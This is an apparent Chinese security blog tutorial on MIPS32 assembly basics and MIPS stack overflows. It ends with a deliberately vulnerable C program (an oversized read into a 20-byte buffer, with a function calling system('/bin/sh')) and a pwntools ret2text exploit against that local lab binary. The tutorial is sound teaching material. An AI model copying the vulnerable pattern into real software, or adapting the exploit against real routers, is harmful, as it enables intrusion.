@@ -1,0 +1,414 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="不得不说现在iot是越来越卷了(T_T) mips基础>这里笔者参考了《家用路由器0day漏洞挖掘技术》    MIPS汇编基础 MIPS32的指令中除了加载/存储指令以外，都使用寄存器或者立即数作为操作数，以便让编译器通过保持对寄存器内数据的频繁存取进一步优化代码的生成性能。MIPS32中的寄存器分为两类，分别是通用寄存器(GPR)和特殊寄存器  寄存器MIPS32中的寄存器分为两类：通">
+<meta property="og:type" content="article">
+<meta property="og:title" content="路由器初探之mips基础及mips栈溢出">
+<meta property="og:url" content="http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:site_name" content="z1r0's blog">
+<meta property="og:description" content="不得不说现在iot是越来越卷了(T_T) mips基础>这里笔者参考了《家用路由器0day漏洞挖掘技术》    MIPS汇编基础 MIPS32的指令中除了加载/存储指令以外，都使用寄存器或者立即数作为操作数，以便让编译器通过保持对寄存器内数据的频繁存取进一步优化代码的生成性能。MIPS32中的寄存器分为两类，分别是通用寄存器(GPR)和特殊寄存器  寄存器MIPS32中的寄存器分为两类：通">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/1.png">
+<meta property="og:image" content="http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/2.png">
+<meta property="og:image" content="http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/4.png">
+<meta property="og:image" content="http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/3.png">
+<meta property="og:image" content="http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/5.png">
+<meta property="article:published_time" content="2022-03-23T13:13:59.000Z">
+<meta property="article:modified_time" content="2023-03-26T02:47:03.553Z">
+<meta property="article:author" content="z1r0">
+<meta property="article:tag" content="IOT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>路由器初探之mips基础及mips栈溢出</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;text=路由器初探之mips基础及mips栈溢出"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;title=路由器初探之mips基础及mips栈溢出"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;is_video=false&amp;description=路由器初探之mips基础及mips栈溢出"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=路由器初探之mips基础及mips栈溢出&amp;body=Check out this article: http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;title=路由器初探之mips基础及mips栈溢出"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;title=路由器初探之mips基础及mips栈溢出"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;title=路由器初探之mips基础及mips栈溢出"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;title=路由器初探之mips基础及mips栈溢出"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;name=路由器初探之mips基础及mips栈溢出&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;t=路由器初探之mips基础及mips栈溢出"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MIPS%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">MIPS汇编基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.1.</span> <span class="toc-text">寄存器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.1.1.</span> <span class="toc-text">通用寄存器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">特殊寄存器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E8%8A%82%E5%BA%8F"><span class="toc-number">1.2.</span> <span class="toc-text">字节序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MIPS%E6%8C%87%E4%BB%A4"><span class="toc-number">1.3.</span> <span class="toc-text">MIPS指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LOAD-x2F-STORE%E6%8C%87%E4%BB%A4"><span class="toc-number">1.3.1.</span> <span class="toc-text">LOAD/STORE指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E6%8C%87%E4%BB%A4"><span class="toc-number">1.3.2.</span> <span class="toc-text">算术运算指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E6%AF%94%E8%BE%83%E6%8C%87%E4%BB%A4"><span class="toc-number">1.3.3.</span> <span class="toc-text">类比较指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SYSCALL"><span class="toc-number">1.3.4.</span> <span class="toc-text">SYSCALL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%94%AF%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4"><span class="toc-number">1.3.5.</span> <span class="toc-text">分支跳转指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4"><span class="toc-number">1.3.6.</span> <span class="toc-text">跳转指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">函数调用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MIPS%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">2.</span> <span class="toc-text">MIPS栈溢出</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">3.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        路由器初探之mips基础及mips栈溢出
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">z1r0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-23T13:13:59.000Z" itemprop="datePublished">2022-03-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E8%B7%AF%E7%94%B1%E5%99%A8/">路由器</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/IOT/" rel="tag">IOT</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>不得不说现在iot是越来越卷了(T_T)</p>
+<p>mips基础&gt;这里笔者参考了《家用路由器0day漏洞挖掘技术》</p>
+</blockquote>
+<font size="4">
+
+<h1 id="MIPS汇编基础"><a href="#MIPS汇编基础" class="headerlink" title="MIPS汇编基础"></a>MIPS汇编基础</h1><blockquote>
+<p>MIPS32的指令中除了加载/存储指令以外，都使用寄存器或者立即数作为操作数，以便让编译器通过保持对寄存器内数据的频繁存取进一步优化代码的生成性能。MIPS32中的寄存器分为两类，分别是通用寄存器(GPR)和特殊寄存器</p>
+</blockquote>
+<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>MIPS32中的寄存器分为两类：通用寄存器(GPR)和特殊寄存器</p>
+<h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p>在MIPS中有32个通用寄存器。</p>
+<blockquote>
+<p>zero：第0号寄存器，其值始终为0</p>
+<p>$at：保留寄存器</p>
+<p>$v0~$v1：保存表达式或函数返回结果</p>
+<p>$a0~$a3：作为函数的前4个参数</p>
+<p>$t0~$t7：供汇编程序使用的临时寄存器</p>
+<p>$s0~$s7：子函数使用时需要先保存原寄存器的值</p>
+<p>$t8~$t9：供汇编程序使用的临时寄存器</p>
+<p>$k0~k1：保留，中断处理函数使用</p>
+<p>$gp：全局指针</p>
+<p>$sp：堆栈指针，指向堆栈的栈顶</p>
+<p>$fp：保存栈指针</p>
+<p>$ra：返回地址</p>
+</blockquote>
+<h3 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a>特殊寄存器</h3><p>在MIPS中有3个特殊寄存器</p>
+<blockquote>
+<p>PC：程序计数器</p>
+<p>HI：乘除结果高位寄存器</p>
+<p>LO：乘除结果低位寄存器</p>
+</blockquote>
+<p>在乘法时，HI存储高32位，LO存储低32位。在除法时，HI保存余数，LO存储商</p>
+<h2 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h2><p>和x86体系都差不多，大端序，小端序。拿个0xdeadbeef来演示一下</p>
+<p>大端序：de ad be ef</p>
+<p>小端序：ef be ad de</p>
+<h2 id="MIPS指令"><a href="#MIPS指令" class="headerlink" title="MIPS指令"></a>MIPS指令</h2><h3 id="LOAD-x2F-STORE指令"><a href="#LOAD-x2F-STORE指令" class="headerlink" title="LOAD/STORE指令"></a>LOAD/STORE指令</h3><p>这种指令有14条：lb,lbu,lh,lhu,ll,lw,lwl,lwr,sb,sc,sh,sw,swl,swr,move</p>
+<blockquote>
+<p>以’l’开头都是加载指令，以’s’开头都是存储指令</p>
+<p>LA：用于将一个地址或标签存入一个寄存器</p>
+<p>LI：用于将一个立即数存入一个通用寄存器</p>
+<p>LW：用于从一个指定的地址加载一个word类型的值到一个寄存器中</p>
+<p>SW：用于将源寄存器中的值存入指定的地址</p>
+<p>MOVE：用于寄存器之产间值的传递</p>
+</blockquote>
+<h3 id="算术运算指令"><a href="#算术运算指令" class="headerlink" title="算术运算指令"></a>算术运算指令</h3><p>算术运算指令有21条：add,addi,addiu,addiu,sub,subu,clo,clz,slt,slti,sltiu,sltu,mul,mult,multu,madd,msub,msubu,div,divu，实现了加减，比较，乘，乘累加，除等运算</p>
+<blockquote>
+<p>add是带符号数相加</p>
+<p>sub带符号数相减</p>
+<p>mult把64Bits的积存储到HI和LO中</p>
+<p>mfhi $t0：$t0=$HI</p>
+<p>mflo $t1：$t1=$LO</p>
+</blockquote>
+<h3 id="类比较指令"><a href="#类比较指令" class="headerlink" title="类比较指令"></a>类比较指令</h3><p>在MIPS寄存器中没有标志寄存器，但是在MIPS指令中有一种指令——SLT系列指令，可以通过比较设置某个寄存器后与分支跳转指令联合使用，类似x86比较指令。slt,slti,sltiu,sltu</p>
+<blockquote>
+<p>SLT：指令在$Rs小于$Rt时设置寄存器$Rd为1，否则$Rd为0，例如：SLT $Rd, $Rs, $Rt</p>
+<p>SLTI：指令在$Rs小于立即数imm时设置寄存器$Rt为1,否则设置$Rt为0，例如：slti $Rt, $Rs, imm</p>
+<p>SLTU：在$Rs小于$Rt时设置寄存器$Rd为1,否则设置$Rd为0，例如：sltu $Rd, $Rs, $Rt</p>
+</blockquote>
+<h3 id="SYSCALL"><a href="#SYSCALL" class="headerlink" title="SYSCALL"></a>SYSCALL</h3><p>产生一个软中断，从而实现系统调用。系统调用号存放在$v0中，参数存放在$a0~$a3中。如果参数过多，会有另一套机制来处理。系统调用的返回值通常放在$v0中。如果系统调用出错，则会在$a3中返回一个错误号。</p>
+<h3 id="分支跳转指令"><a href="#分支跳转指令" class="headerlink" title="分支跳转指令"></a>分支跳转指令</h3><p>在MIPS中，分支中转指令本身可以通过比较两个寄存器中的值来决定是否中转。</p>
+<blockquote>
+<p>b target：无条件的分支跳转，则中转到target标签处</p>
+<p>beq $t0, t1, target：如果$t0=$t1，则跳转到target标签处</p>
+<p>blt $t0, $ t1, target：如果$t0 &lt; $t1，则跳转到target标签处</p>
+<p>ble $t0, $t1, target：如果$t0 &lt;= $t1，则跳转到target标签处</p>
+<p>bgt $t0, $t1, target：如果$t0 &gt; $t1，则跳转到target标签处</p>
+<p>bge $t0, $t1, target：如果$t0 &gt;= $t1，则跳转到target标签处</p>
+<p>bne $t0, $t1, target：如果$t0 != $t1，则跳转到target标签处</p>
+</blockquote>
+<h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><blockquote>
+<p>j target：无条件跳转，将跳转到target标签处</p>
+<p>jr $t3：跳转到$t3寄存器指向的地址处</p>
+<p>jal target：中转到target标签处，并保存返回地址到$ra中</p>
+</blockquote>
+<h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><p>在MIPS32架构中，函数被分为两种即叶子函数和非叶子函数。通俗点来说就是不调用其它的函数的函数可以看成叶子函数，一个函数调用了其它的函数这个函数就是非叶子函数</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">p</span><span class="params">()</span>{</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"hello world"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>{</span><br><span class="line">    p();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在上面这个程序中，p是叶子函数，main是非叶子函数</p>
+<p>MIPS32在进入函数时是将当前栈指针向下移动n到该函数的stack frame，函数返回时再加上偏移量恢复栈指针</p>
+<p>传参过程中，前四个参数$a0-$a3，多余的会保存在调用函数的预留的栈顶空间内</p>
+<p>MIPS调用函数时会把函数的返回地址直接存入$RA寄存器</p>
+<p>寄存器出入栈时都需要指定偏移量</p>
+<p>这里笔者将上面的这个程序使用mips的gcc来进行编译然后看一下汇编</p>
+<p>笔者这里的环境只需要装一个<code>交叉编译环境 buildroot</code>，搭建环境可以看看这篇文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3826%EF%BC%8C%E5%8F%A6%E5%A4%96%E8%BF%98%E9%9C%80%E8%A6%81%E8%A3%85qemu%EF%BC%8C%E7%AC%94%E8%80%85%E5%9C%A8kernel%E5%88%9D%E5%A7%8B%E7%9A%84%E9%82%A3%E4%B8%AA%E7%AB%A0%E8%8A%82%E5%B7%B2%E7%BB%8F%E5%86%99%E8%BF%87">https://xz.aliyun.com/t/3826，另外还需要装qemu，笔者在kernel初始的那个章节已经写过</a></p>
+<p>拿到ghidra里反汇编一下，先看看main函数</p>
+<p><img src="/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/1.png" alt="1"></p>
+<p>可以看到进入函数时是将当前栈指针向下移动n到该函数的stack frame，函数返回时再加上偏移量恢复栈指针</p>
+<p>在0x107d8这里bal p，也就是跳转到了p函数，跟进p函数。在调用非叶子函数时，会把返回地址存入堆栈</p>
+<p><img src="/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/2.png" alt="2"></p>
+<p>这个函数一开始还是应了上面那句话<code>进入函数时是将当前栈指针向下移动n到该函数的stack frame，函数返回时再加上偏移量恢复栈指针</code></p>
+<p>在0x10780这里jalr了puts。也就是调用了puts这个函数，前面说到过$a0~$a3是前4个参数，这里只用了a0，<code>lw v0, -0x7fcc(gp); addiu $ a0, v0, 0x8e0</code>lw是加载指令，在这里是将ptr_21044的值加载到v0中(21044里的值为0)，接着a0 = v0 + 0x8e0，现在a0里面是为0x8e0，其实也就是helloworld。现在一参有了，系统函数有了然后直接jalr实现puts(“hello world”);</p>
+<h1 id="MIPS栈溢出"><a href="#MIPS栈溢出" class="headerlink" title="MIPS栈溢出"></a>MIPS栈溢出</h1><p>MIPS一定了解之后可以试着看一看栈溢出。其实最经典的ret2text的利用手法和x86体系没有多大的区别，都是找准偏移然后覆盖掉返回地址，从上面的例子可以看到在调用非叶子函数时，会把返回地址存入堆栈，所以ret2text可以直接覆盖返回地址。直接上一个例子</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bk</span><span class="params">()</span>{</span><br><span class="line">	system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>{</span><br><span class="line">	<span class="type">char</span> a[<span class="number">20</span>];</span><br><span class="line">	read(<span class="number">0</span>, a, <span class="number">0x100</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>**argv)</span>{</span><br><span class="line">	vuln();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mipsel-linux-gcc  exp.c -no-pie -static -o  exp</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里笔者使用了-static，不然的话会有mipsel-binfmt-P: Could not open ‘/lib/ld-uClibc.so.0’: No such file or directory这个错误。</p>
+<p>源代码很直观，漏洞点出现在了read这里</p>
+<p><img src="/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/4.png" alt="4"></p>
+<p><img src="/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/3.png" alt="3"></p>
+<p>根据上面的MIPS知识，可以看到在vuln函数中，<code>or s8,sp,zero</code> ``addiu v0,s8,0x18`发现距离栈底为0x18，再加上栈底距ret_addr的4位偏移（因为是32位程序）就可以覆盖掉ret_addr(使用非叶子函数时，会把返回地址存入堆栈)。exp如下：</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'mips'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./exp'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * (<span class="number">0x18</span> + <span class="number">4</span>) + p32(<span class="number">0x4003b0</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/5.png" alt="5"></p>
